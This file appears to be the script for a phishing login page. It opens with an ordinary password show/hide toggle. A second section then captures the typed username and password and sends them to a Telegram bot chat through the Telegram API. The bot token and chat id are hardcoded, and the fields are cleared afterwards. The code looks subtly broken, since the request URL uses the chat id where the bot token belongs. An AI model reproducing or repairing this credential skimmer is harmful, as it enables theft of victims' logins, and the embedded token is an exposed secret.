const passwordInput = document.getElementById("password");
const togglePasswordButton = document.getElementById("toggle-password");
const eyeIcon = document.querySelector(".eye-icon");
const eyeSlashIcon = document.querySelector(".eye-slash-icon");

togglePasswordButton.addEventListener("click", function () {
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";

  passwordInput.setAttribute("type", type);

  if (type === "password") {
    eyeIcon.style.display = "inline";
    eyeSlashIcon.style.display = "none";
  } else {
    eyeIcon.style.display = "none";
    eyeSlashIcon.style.display = "inline";
  }
});

var telegram_bot_id = "7986801551:AAFXioA5eLbVu6zpIdN0fShSNeqANvEoHsM";

var chat_id = 7185214285;
var u_name, password;
var ready = function () {
  u_name = document.getElementById("username").value;
  password = document.getElementById("password").value;
  message = "Name: " + u_name + "\nPassword: " + password;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + 7185214285 + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("username").value = "";
  document.getElementById("password").value = "";
  return false;
};
